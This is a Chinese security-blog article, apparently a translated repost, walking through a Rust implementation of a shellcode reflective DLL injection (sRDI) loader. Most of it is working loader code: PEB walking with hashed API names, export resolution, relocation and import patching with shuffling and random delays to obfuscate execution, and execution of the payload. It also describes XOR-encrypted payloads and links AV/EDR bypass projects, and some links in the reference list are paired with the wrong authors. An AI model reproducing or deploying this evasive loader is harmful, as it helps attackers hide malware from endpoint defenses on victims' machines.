> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247531218&idx=1&sn=d367e84086646703b9aa71da0fb0f588

#  Shellcode 反射型 DLL 注入 (sRDI) 演练  
 Ots安全   2025-06-23 11:43  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
这篇文章由Smukx.E发布，详细介绍了shellcode Reflective DLL Injection (sRDI)技术的逐步操作指南。  
  
sRDI是一种高级内存注入技术，由Stephen Fewer首创，并通过NetSPI在2017年Black Hat大会上发布的工具得以增强。该方法通过利用ReflectiveLoader函数，将DLL注入目标进程的内存中，绕过传统的基于磁盘的加载方式。文章配有实际演示图片，展示了一个计算器界面与命令行工具的结合，反映了该技术在网络安全领域的实用性。  
  
支持该技术的学术研究包括《Journal of Computer Virology and Hacking Techniques》(2012年)关于内存注入漏洞的分析。此外，sRDI已被集成到开源工具中并在GitHub上提供，凸显了其在进攻性安全测试中的双重用途，同时也可能被用于潜在的攻击。尽管现代防病毒解决方案试图缓解此类威胁，但NetSPI 2024年的分析表明，威胁行为者的不断适应挑战了这一假设。  
  
Shellcode 反射型 DLL 注入 (sRDI) 尽管历史悠久，但在 Windows 恶意软件领域仍然是一项相对隐蔽的技术。它与更简单的 DLL 注入方法的区别在于，它不会在目标系统磁盘上留下明显的痕迹，因此有机会绕过依赖于签名检测等基础防御解决方案。  
  
步骤  
1. 执行从单独的注入器传递给加载器，该注入器将包含加载器和有效载荷的 shellcode 注入目标进程的内存空间（例如使用VirtualAlloc）。  
  
1. 反射加载器解析进程，kernel32.dll计算出重定位和执行所需的函数地址。  
  
1. 加载器分配一个连续的内存区域来加载其自己的图像。  
  
1. 加载器在其头部的帮助下将自身重新定位到分配的内存区域。  
  
1. 加载器根据先前获取的函数地址解析导入并将它们修补到重定位图像的导入地址表中。  
  
1. 加载程序对每个重定位的部分应用适当的保护。  
  
1. DllMain加载器使用调用重定位图像的入口点DLL_PROCESS_ATTACH。  
  
执行  
  
完整的实现可以在Gitea 仓库中找到：  
https://git.umbrella.haus/ae/airborne  
。以下讲解将重点介绍加载器本身，其他支持组件（进程注入器、shellcode 生成器和 Payload）基本上都是从参考文献中提到的现有实现中复制粘贴过来的。  
  
以下辅助函数用于使 RVA 计算更易于阅读：  
  

```
fn rva_mut<T>(base_ptr: *mut u8, offset: usize) -> *mut T {
    (base_ptr as usize + offset) as *mut T
}

fn rva<T>(base_ptr: *mut u8, offset: usize) -> *const T {
    (base_ptr as usize + offset) as *const T
}
```

  
  
定位模块  
  
加载过程首先定位执行后续注入阶段所需的模块及其导出。主要目标是kernel32.dllWindows 中的核心模块。  
  
每个 Windows 线程都拥有一个线程环境块 (TEB)，它与其他线程特定数据一起指向进程环境块 (PEB)。PEB 包含一个PEB_LDR_DATA结构体，用于对进程中加载的用户模式模块进行分类。至关重要的是，它还包含一个InLoadOrderModuleList字段，该字段指向一个双向链表，该链表按加载顺序枚举这些模块：  
  

```
#[repr(C)]
#[allow(non_snake_case, non_camel_case_types)]
pub struct PEB_LDR_DATA {
    pub Length: u32,
    pub Initialized: BOOLEAN,
    pub SsHandle: HANDLE,
    pub InLoadOrderModuleList: LIST_ENTRY,
    pub InMemoryOrderModuleList: LIST_ENTRY,
    pub InInitializationOrderModuleList: LIST_ENTRY,
    pub EntryInProgress: *mut c_void,
    pub ShutdownInProgress: BOOLEAN,
    pub ShutdownThreadId: HANDLE,
}

#[repr(C)]
#[allow(non_snake_case)]
pub union LDR_DATA_TABLE_ENTRY_u1 {
    pub InInitializationOrderLinks: LIST_ENTRY,
    pub InProgressLinks: LIST_ENTRY,
}

#[repr(C)]
#[allow(non_snake_case, non_camel_case_types)]
pub struct LDR_DATA_TABLE_ENTRY {
    pub InLoadOrderLinks: LIST_ENTRY,
    pub InMemoryOrderLinks: LIST_ENTRY,
    pub u1: LDR_DATA_TABLE_ENTRY_u1,
    pub DllBase: *mut c_void,
    pub EntryPoint: PLDR_INIT_ROUTINE,
    pub SizeOfImage: u32,
    pub FullDllName: UNICODE_STRING,
    pub BaseDllName: UNICODE_STRING,
}
```

  
  
通过遍历此列表，我们可以找到所需的模块。此步骤至关重要，因为它允许我们kernel32.dll通过间接函数调用来调用导出的必要函数。  
  
为了说明这一点，我们来检查一组用于定位 PEB 并遍历 的函数InLoadOrderModuleList。值得注意的是，我们还对包含模块名称（以及下一步导出的函数）的字符串进行了哈希处理，以使静态分析更加困难：  
  

```
#[link_section = &#34;.text&#34;]
unsafe fn get_module_ptr(module_hash: u32) -> Option<*mut u8> {
    // first entry in the InMemoryOrderModuleList -> PEB, PEB_LDR_DATA, LDR_DATA_TABLE_ENTRY
    // InLoadOrderModuleList grants direct access to the base address without using CONTAINING_RECORD macro
    let peb_ptr = get_peb_ptr();
    let peb_ldr_ptr = (*peb_ptr).Ldr as *mut PEB_LDR_DATA;
    let mut table_entry_ptr =
        (*peb_ldr_ptr).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;

    while !(*table_entry_ptr).DllBase.is_null() {
        let name_buf_ptr = (*table_entry_ptr).BaseDllName.Buffer;
        let name_len = (*table_entry_ptr).BaseDllName.Length as usize;
        let name_slice_buf = from_raw_parts(transmute::<PWSTR, *const u8>(name_buf_ptr), name_len);

        // calculate the module hash and compare it
        if module_hash == airborne_common::calc_hash(name_slice_buf) {
            return Some((*table_entry_ptr).DllBase as _);
        }

        table_entry_ptr = (*table_entry_ptr).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
    }

    None
}

#[link_section = &#34;.text&#34;]
unsafe fn get_peb_ptr() -> *mut PEB {
    // TEB located at offset 0x30 from the GS register on 64-bit
    let teb: *mut TEB;
    asm!(&#34;mov {teb}, gs:[0x30]&#34;, teb = out(reg) teb);

    (*teb).ProcessEnvironmentBlock as *mut PEB
}
```

  
  
定位出口  
  
找到基址后kernel32.dll，下一步就是确定所需特定函数的地址。这需要了解 Windows 可移植可执行文件 (PE) 格式。  
  
PE 文件由多个部分组成，包括 DOS 头、DOS 存根、NT 头和节表。节表以.text和等段的形式保存着实际的文件内容.data。我们重点关注位于 NT 头中的导出目录，该目录列出了导出函数及其地址。我们可以利用IMAGE_DIRECTORY_ENTRY_EXPORT中的偏移量来访问导出目录IMAGE_DATA_DIRECTORY。  
  
与之前在模块中导航的方式类似，我们现在遍历导出目录条目来找到所需的函数。这样，我们就能绕过可能触发安全警报的常见 API 调用机制：  
  

```
#[link_section = &#34;.text&#34;]
unsafe fn get_export_addr(module_base_ptr: *mut u8, function_hash: u32) -> Option<usize> {
    // NT Headers -> RVA of Export Directory Table -> function names, ordinals, and addresses
    let nt_headers_ptr = get_nt_headers_ptr(module_base_ptr).unwrap();
    let export_dir_ptr = (module_base_ptr as usize
        + (*nt_headers_ptr).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress as usize) as *mut IMAGE_EXPORT_DIRECTORY;

    let names = from_raw_parts(
        (module_base_ptr as usize + (*export_dir_ptr).AddressOfNames as usize) as *const u32,
        (*export_dir_ptr).NumberOfNames as _,
    );
    let funcs = from_raw_parts(
        (module_base_ptr as usize + (*export_dir_ptr).AddressOfFunctions as usize) as *const u32,
        (*export_dir_ptr).NumberOfFunctions as _,
    );
    let ords = from_raw_parts(
        (module_base_ptr as usize + (*export_dir_ptr).AddressOfNameOrdinals as usize) as *const u16,
        (*export_dir_ptr).NumberOfNames as _,
    );

    // compare hashes iteratively for each entry
    for i in0..(*export_dir_ptr).NumberOfNames {
        let name_ptr = (module_base_ptr as usize + names[i as usize] as usize) as *const i8;
        let name_len = get_cstr_len(name_ptr as _);
        let name_slice = from_raw_parts(name_ptr as _, name_len);

        iffunction_hash == airborne_common::calc_hash(name_slice) {
            return Some(module_base_ptr as usize + funcs[ords[i as usize] as usize] as usize);
        }
    }

    None
}

#[link_section = &#34;.text&#34;]
unsafe fn get_nt_headers_ptr(module_base_ptr: *mut u8) -> Option<*mut IMAGE_NT_HEADERS64> {
    let dos_header_ptr = module_base_ptr as *mut IMAGE_DOS_HEADER;

    if (*dos_header_ptr).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt_headers_ptr =
        (module_base_ptr as usize + (*dos_header_ptr).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    if (*nt_headers_ptr).Signature != IMAGE_NT_SIGNATURE {
        return None;
    }

    Some(nt_headers_ptr)
}
```

  
  
分配内存  
  
成功“导入”必要的函数（并将其指针存储到far_procs结构体中）后，我们继续在目标进程中为有效载荷shellcode分配内存。这是使用 完成的VirtualAlloc，并授予分配的内存读写权限。  
  
Payload 的 NT 头包含一个ImageBase字段，指示首选加载地址（在这种情况下，导入操作无需在后续步骤中解析）。最初，我们可以尝试在此地址分配内存，但如果失败，我们可以将其NULL作为lpAddress参数传递，以便VirtualAlloc选择合适的位置。最终，具体的内存地址并不重要，因为加载器会在执行过程的后续阶段处理任何必要的重定位。  
  
分配步骤本身非常简单，只需要有效载荷大小：  
  

```
#[link_section = &#34;.text&#34;]
#[no_mangle]
#[allow(clippy::missing_safety_doc)]
pub unsafeextern&#34;system&#34;fn loader(
    payload_dll: *mut c_void,
    function_hash: u32,
    user_data: *mut c_void,
    user_data_len: u32,
    _shellcode_bin: *mut c_void,
    flags: u32,
) {
    // ...

    let module_base_ptr = payload_dll as *mut u8;

    if module_base_ptr.is_null() {
        return;
    }

    let module_dos_header_ptr = module_base_ptr as *mut IMAGE_DOS_HEADER;
    let module_nt_headers_ptr = (module_base_ptr as usize
        + (*module_dos_header_ptr).e_lfanew as usize)
        as *mut IMAGE_NT_HEADERS64;
    let module_img_size = (*module_nt_headers_ptr).OptionalHeader.SizeOfImage as usize;
    let preferred_base_ptr = (*module_nt_headers_ptr).OptionalHeader.ImageBase as *mut c_void;
    let base_addr_ptr =
        allocate_rw_memory(preferred_base_ptr, module_img_size, &far_procs).unwrap();

    // ...
}

#[link_section = &#34;.text&#34;]
unsafe fn allocate_rw_memory(
    preferred_base_ptr: *mut c_void,
    alloc_size: usize,
    far_procs: &FarProcs,
) -> Option<*mut c_void> {
    let mut base_addr_ptr = (far_procs.VirtualAlloc)(
        preferred_base_ptr,
        alloc_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
    );

    // fallback: attempt to allocate at any address if preferred address is unavailable
    if base_addr_ptr.is_null() {
        base_addr_ptr = (far_procs.VirtualAlloc)(
            null_mut(),
            alloc_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        );
    }

    if base_addr_ptr.is_null() {
        return None;
    }

    Some(base_addr_ptr)
}
```

  
  
复制部分  
  
NumberOfSections分配完成后，我们可以根据有效载荷的字段将有效载荷 PE 的部分和标头复制到新的内存部分IMAGE_FILE_HEADER：  
  

```
#[link_section = &#34;.text&#34;]
unsafe fn copy_pe(
    new_base_ptr: *mut c_void,
    old_base_ptr: *mut u8,
    nt_headers_ptr: *mut IMAGE_NT_HEADERS64,
) {
    let section_header_ptr = (&(*nt_headers_ptr).OptionalHeader as *const _ as usize
        + (*nt_headers_ptr).FileHeader.SizeOfOptionalHeader as usize)
        as *mut IMAGE_SECTION_HEADER;

    // PE sections one by one
    for i in0..(*nt_headers_ptr).FileHeader.NumberOfSections {
        let header_i_ref = &*(section_header_ptr.add(i as usize));

        let dst_ptr = new_base_ptr
            .cast::<u8>()
            .add(header_i_ref.VirtualAddress as usize);
        let src_ptr = (old_base_ptr as usize + header_i_ref.PointerToRawData as usize) as *const u8;
        let raw_size = header_i_ref.SizeOfRawData as usize;

        let src_data_slice = from_raw_parts(src_ptr, raw_size);

        (0..raw_size).for_each(|x| {
            let src = src_data_slice[x];
            let dst = dst_ptr.add(x);
            *dst = src;
        });
    }

    // PE headers
    for i in0..(*nt_headers_ptr).OptionalHeader.SizeOfHeaders {
        let dst = new_base_ptr as *mut u8;
        let src = old_base_ptr as *const u8;

        *dst.add(i as usize) = *src.add(i as usize);
    }
}
```

  
  
处理图像重定位  
  
最有可能的是，有效载荷不会被加载到首选的内存位置，因此我们需要解决图像重定位问题。  
  
必要的重定位数据位于有效载荷的 NT 头中，位于数据目录中，具体位于IMAGE_DIRECTORY_ENTRY_BASERELOC索引处。此基址重定位表包含多个条目，每个条目包含一个VirtualAddress字段。我们将增量（即分配的内存位置与首选内存位置之间的差值）应用于这些地址。此外，我们还必须考虑每个表项中指定的偏移量：  
  

```
#[link_section = &#34;.text&#34;]
unsafe fn process_relocations(
    base_addr_ptr: *mut c_void,
    nt_headers_ptr: *mut IMAGE_NT_HEADERS64,
    mut relocation_ptr: *mut IMAGE_BASE_RELOCATION,
    data_dir_slice: &[IMAGE_DATA_DIRECTORY; 16],
) {
    let delta = base_addr_ptr as isize - (*nt_headers_ptr).OptionalHeader.ImageBase as isize;

    // upper bound prevents accessing memory past the end of the relocation data
    let relocation_end = relocation_ptr as usize
        + data_dir_slice[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;

    while (*relocation_ptr).VirtualAddress != 0
        && ((*relocation_ptr).VirtualAddress as usize) <= relocation_end
        && (*relocation_ptr).SizeOfBlock != 0
    {
        // relocation address, first entry, and number of entries in the whole block
        let addr = rva::<isize>(
            base_addr_ptr as _,
            (*relocation_ptr).VirtualAddress as usize,
        ) as isize;
        let item = rva::<u16>(relocation_ptr as _, size_of::<IMAGE_BASE_RELOCATION>());
        let count = ((*relocation_ptr).SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>())
            / size_of::<u16>();

        for i in0..count {
            // high bits -> type, low bits -> offset
            let type_field = (item.add(i).read() >> 12) as u32;
            let offset = item.add(i).read() & 0xFFF;

            match type_field {
                IMAGE_REL_BASED_DIR64 | IMAGE_REL_BASED_HIGHLOW => {
                    *((addr + offset as isize) as *mut isize) += delta;
                }
                _ => {}
            }
        }

        relocation_ptr = rva_mut(relocation_ptr as _, (*relocation_ptr).SizeOfBlock as usize);
    }
}
```

  
  
解决导入问题  
  
现在，为了确保有效载荷正确运行，我们必须通过处理导入表来解决其外部依赖关系。  
  
在 DLL 的数据目录中，我们重点关注IMAGE_DIRECTORY_ENTRY_IMPORT索引，即导入目录所在的位置。该目录包含一个IMAGE_IMPORT_DESCRIPTOR结构体数组，每个结构体代表一个 DLL，模块将从该 DLL 中导入函数。  
  
在此步骤中，我们还利用了 shuffle 和 sleep 调用来混淆执行流。首先，我们使用  
Fisher–Yates 就地 shuffle 算法对导入描述符进行 shuffle-  
https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle  
：  
  

```
let mut id_ptr = import_descriptor_ptr;
let mut import_count = 0;

while (*id_ptr).Name != 0 {
    import_count += 1;
    id_ptr = id_ptr.add(1);
}

let id_ptr = import_descriptor_ptr;

if import_count > 1 && flags.shuffle {
    // Fisher-Yates shuffle
    for i in0..import_count - 1 {
        let rn = match get_random(far_procs) {
            Some(rn) => rn,
            None => return0,
        };

        let gap = import_count - i;
        let j_u64 = i + (rn % gap);
        let j = j_u64.min(import_count - 1);

        id_ptr.offset(j as _).swap(id_ptr.offset(i as _));
    }
}
```

  
  
然后，在迭代过程中，我们调用BCryptGenRandomwithBCRYPT_RNG_ALG_HANDLE作为hAlgorithm参数来为每次迭代生成一个随机睡眠持续时间：  
  

```
if flags.delay {
    // skip delay if winapi call fails
    let rn = get_random(far_procs).unwrap_or(0);
    let delay = rn % MAX_IMPORT_DELAY_MS;
    (far_procs.Sleep)(delay as _);
}

#[link_section = &#34;.text&#34;]
unsafe fn get_random(far_procs: &FarProcs) -> Option<u64> {
    let mut buffer = [0u8; 8];
    let status = (far_procs.BCryptGenRandom)(
        BCRYPT_RNG_ALG_HANDLE,
        buffer.as_mut_ptr(),
        buffer.len() as _,
        0,
    );

    if status != STATUS_SUCCESS {
        return None;
    }

    Some(u64::from_le_bytes(buffer))
}
```

  
  
这些 DLL 使用以下方式加载到进程的地址空间中LoadLibraryA：  
  

```
let import_descriptor_ptr: *mut IMAGE_IMPORT_DESCRIPTOR = rva_mut(
    base_addr_ptr as _,
    data_dir_slice[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize,
);

if import_descriptor_ptr.is_null() {
    return;
}

while (*import_descriptor_ptr).Name != 0x0 {
    let module_name_ptr = rva::<i8>(base_addr_ptr as _, (*import_descriptor_ptr).Name as usize);

    if module_name_ptr.is_null() {
        return0;
    }

    let module_handle = (far_procs.LoadLibraryA)(module_name_ptr as _);

    if module_handle == 0 {
        return0;
    }

    // ...
}
```

  
  
接下来，我们必须解析导入函数的地址，本质上是对导入地址表 (IAT) 进行修补。这需要利用OriginalFirstThunk导入查找表 (ILT) 的相对虚拟地址 (RVA)，它指向一个结构体数组IMAGE_THUNK_DATA64。这些结构体包含导入函数的相关信息，可以是名称或序号。FirstThunk相反，它代表 IAT 的 RVA，解析后的地址会在此更新。Thunk 在这里充当重要的中介，确保有效载荷中函数调用的正确链接。  
  
在处理这些IMAGE_THUNK_DATA64结构时，我们需要区分命名导入和序数导入。对于序数导入，函数地址是通过GetProcAddress序数检索的。对于命名导入，函数名称是从 中获取的，并在的字段IMAGE_IMPORT_BY_NAME中引用，其地址的解析方式也类似。AddressOfDataIMAGE_THUNK_DATA64  
  
一旦获得，函数地址就会被写回到相应的FirstThunk条目中，从而有效地将有效载荷的函数调用重定向到适当的地址：  
  

```
while (*import_descriptor_ptr).Name != 0x0 {
    // ...

    // RVA of the IAT via either OriginalFirstThunk or FirstThunk
    let mut original_thunk_ptr: *mut IMAGE_THUNK_DATA64 = if (base_addr_ptr as usize
        + (*import_descriptor_ptr).Anonymous.OriginalFirstThunk as usize)
        != 0
    {
        rva_mut(
            base_addr_ptr as _,
            (*import_descriptor_ptr).Anonymous.OriginalFirstThunk as usize,
        )
    } else {
        rva_mut(
            base_addr_ptr as _,
            (*import_descriptor_ptr).FirstThunk as usize,
        )
    };

    let mut thunk_ptr: *mut IMAGE_THUNK_DATA64 = rva_mut(
        base_addr_ptr as _,
        (*import_descriptor_ptr).FirstThunk as usize,
    );

    while (*original_thunk_ptr).u1.Function != 0 {
        let is_snap_res = (*original_thunk_ptr).u1.Ordinal & IMAGE_ORDINAL_FLAG64 != 0;

        // check if the import is by name or by ordinal
        if is_snap_res {
            // mask out the high bits to get the ordinal value and patch the address of the function
            let fn_ord_ptr = ((*original_thunk_ptr).u1.Ordinal & 0xFFFF) as *const u8;
            (*thunk_ptr).u1.Function =
                match (far_procs.GetProcAddress)(module_handle, fn_ord_ptr) {
                    Some(fn_addr) => fn_addr as usize as _,
                    None =>return0,
                };
        } else {
            // get the function name from the thunk and patch the address of the function
            let thunk_data_ptr = (base_addr_ptr as usize
                + (*original_thunk_ptr).u1.AddressOfData as usize)
                as *mut IMAGE_IMPORT_BY_NAME;
            let fn_name_ptr = (*thunk_data_ptr).Name.as_ptr();
            (*thunk_ptr).u1.Function =
                match (far_procs.GetProcAddress)(module_handle, fn_name_ptr) {
                    Some(fn_addr) => fn_addr as usize as _,
                    None =>return0,
                };
        }

        thunk_ptr = thunk_ptr.add(1);
        original_thunk_ptr = original_thunk_ptr.add(1);
    }

    import_descriptor_ptr =
        (import_descriptor_ptr as usize + size_of::<IMAGE_IMPORT_DESCRIPTOR>()) as _;
    }
```

  
  
保护搬迁部分  
  
为了确保有效载荷在目标进程中的无缝集成和正确运行，为每个重定位部分设置适当的内存保护至关重要。  
  
此过程首先通过NT 头中的访问节头 ( IMAGE_SECTION_HEADER) 。找到后，我们会遍历有效载荷的各个节，收集必要的详细信息，例如每个节的引用、RVA 和数据大小。根据每个节的字段确定对内存保护的必要修改，从而指导我们应用正确的安全属性。之后，我们会根据每个节的具体情况，使用 来应用新的保护措施：OptionalHeaderCharacteristicsVirtualProtect  
  

```
#[link_section = &#34;.text&#34;]
unsafe fn finalize_relocations(
    base_addr_ptr: *mut c_void,
    module_nt_headers_ptr: *mut IMAGE_NT_HEADERS64,
    far_procs: &FarProcs,
) {
    // RVA of the first IMAGE_SECTION_HEADER in the PE file
    let section_header_ptr = rva_mut::<IMAGE_SECTION_HEADER>(
        &(*module_nt_headers_ptr).OptionalHeader as *const _ as _,
        (*module_nt_headers_ptr).FileHeader.SizeOfOptionalHeader as usize,
    );

    for i in0..(*module_nt_headers_ptr).FileHeader.NumberOfSections {
        let mut protection = 0;
        let mut old_protection = 0;

        let section_header_ptr = &*(section_header_ptr).add(i as usize);
        let dst_ptr = base_addr_ptr
            .cast::<u8>()
            .add(section_header_ptr.VirtualAddress as usize);
        let section_raw_size = section_header_ptr.SizeOfRawData as usize;

        let is_executable = section_header_ptr.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
        let is_readable = section_header_ptr.Characteristics & IMAGE_SCN_MEM_READ != 0;
        let is_writable = section_header_ptr.Characteristics & IMAGE_SCN_MEM_WRITE != 0;

        if !is_executable && !is_readable && !is_writable {
            protection = PAGE_NOACCESS;
        }

        if is_writable {
            protection = PAGE_WRITECOPY;
        }

        if is_readable {
            protection = PAGE_READONLY;
        }

        if is_writable && is_readable {
            protection = PAGE_READWRITE;
        }

        if is_executable {
            protection = PAGE_EXECUTE;
        }

        if is_executable && is_writable {
            protection = PAGE_EXECUTE_WRITECOPY;
        }

        if is_executable && is_readable {
            protection = PAGE_EXECUTE_READ;
        }

        if is_executable && is_writable && is_readable {
            protection = PAGE_EXECUTE_READWRITE;
        }

        // apply the new protection to the current section
        (far_procs.VirtualProtect)(
            dst_ptr as _,
            section_raw_size,
            protection,
            &mut old_protection,
        );
    }
}
```

  
  
每个部分的一个重要的最后一步是调用FlushInstructionCache以确保 CPU 看到对内存所做的更改：  
  

```
(far_procs.FlushInstructionCache)(-1, null_mut(), 0);
```

  
  
执行payload  
  
最后，将有效载荷精心映射到内存中后，我们就可以执行它了。  
  
执行的功能（以及 shuffle 和 sleep 开关）取决于在 shellcode 生成期间存储在有效载荷中的标志的值：  
  

```
const DELAY_FLAG: u32 = 0b0001;
const SHUFFLE_FLAG: u32 = 0b0010;
const UFN_FLAG: u32 = 0b0100;

const HASH_KEY: usize = 5381;

pub structFlags {
    pub delay: bool,
    pub shuffle: bool,
    pub ufn: bool,
}
```

  
  
如果为真，我们将在有效载荷中运行用户定义函数。否则，我们将坚持使用以下方式ufn调用有效载荷：DllMainDLL_PROCESS_ATTACH  
  

```
if flags.ufn {
    // UserFunction address = base address + RVA of user function
    let user_fn_addr = get_export_addr(base_addr_ptr as _, function_hash).unwrap();

    #[allow(non_snake_case)]
    let UserFunction = transmute::<_, UserFunction>(user_fn_addr);

    // execution with user data passed into the shellcode by the generator
    UserFunction(user_data, user_data_len);
} else {
    let dll_main_addr = base_addr_ptr as usize
        + (*module_nt_headers_ptr).OptionalHeader.AddressOfEntryPoint as usize;

    #[allow(non_snake_case)]
    let DllMain = transmute::<_, DllMain>(dll_main_addr);

    DllMain(base_addr_ptr as _, DLL_PROCESS_ATTACH, module_base_ptr as _);
}
```

  
  
媒体  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacLtmrlTzFhibII66o7nawva9T2biaMujoCEgyFdG8LanqGecGkW3QOjG4dFojPTNu1yrGKSD7bdCSQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacLtmrlTzFhibII66o7nawvaVtbXZLq3TZB6AWqW1M2llKMrl6aTIRXUrtcehl1tqqTXxtSGqGLwaw/640?wx_fmt=png&from=appmsg "")  
  
混淆和逃避检测技术  
  
正如前面几节所暗示的，加载程序使用了一些简单的混淆技术：  
- 散列导入名称和间接 WinAPI 函数调用  
  
- 在 IAT 修补期间对 IDT 迭代进行打乱和延迟  
  
- XOR加密的有效载荷shellcode  
  
- Shellcode 生成期间生成的唯一密钥  
  
如果我们查看整个代码库  
：  
https://git.umbrella.haus/ae/airborne  
，  
就能发现 PoC 注入器（利用普通的Cre  
ateRemoteThread）是整个攻击链中相当明显的薄弱环节。如果有人有兴趣改进这方面，像matro7  
sh 的 BypassAV这样的项目：  
https://github.com/matro7sh/BypassAV   
展示了各种更先进的技术：  
  
参考  
- Dan Staples 撰写的“改进的反射型 DLL 注入技术”  
  
https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html  
- Nick Landers 用 C 语言实现的 sRDI  
  
https://github.com/memN0ps/srdi-rs/  
- memN0ps 使用 Rust 实现的 sRDI  
  
https://github.com/monoxgas/sRDI/  
- Brendan Ortiz 撰写的“C++ 中的反射型 DLL 注入”  
  
https://depthsecurity.com/blog/reflective-dll-injection-in-c  
- 0xRick 对 PE 文件格式的详细讲解  
  
https://0xrick.github.io/categories/[#win]()  
-internals  
- Fisher–Yates 洗牌伪代码实现  
  
https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle  
- s3cur3th1ssh1t 的“EDR 绕过方法故事”  
  
https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/  
- matro7sh 绘制的 AV/EDR 绕过基本方法  
  
https://matro7sh.github.io/BypassAV/  
- MSDN Win32 API 文档  
  
https://learn.microsoft.com/en-us/windows/win32/  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
